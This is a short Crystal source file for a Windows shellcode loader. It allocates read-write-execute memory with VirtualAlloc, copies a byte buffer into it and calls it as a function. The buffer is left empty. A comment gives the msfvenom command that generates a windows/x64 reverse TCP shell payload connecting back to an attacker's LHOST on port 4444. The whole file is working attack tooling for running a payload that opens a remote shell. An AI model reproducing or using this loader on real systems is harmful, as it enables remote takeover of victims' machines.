# Some source / reference
# - https://github.com/crystal-lang/crystal/blob/b5317ace12d11f788f922a8884202dcb3b0de84b/src/crystal/system/win32/fiber.cr
# - https://crystal-lang.org/api/1.7.2/

buf = IO::Memory.new Bytes[ 
    # msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LHOST LPORT=4444 -f csharp -b '\x00\ff'
]
shellcode_len = buf.size

# Constant LibC::PAGE_EXECUTE_READWRITE wasn't available so I used the direct number (0x40)
ptr = LibC.VirtualAlloc(nil, shellcode_len, LibC::MEM_COMMIT, 0x40) # Allocate
Intrinsics.memcpy(ptr, buf.buffer, shellcode_len, false) # Copy shellcode into the executable memory zone

t = Proc(Int32).new(ptr, ptr)
t.call # Execute
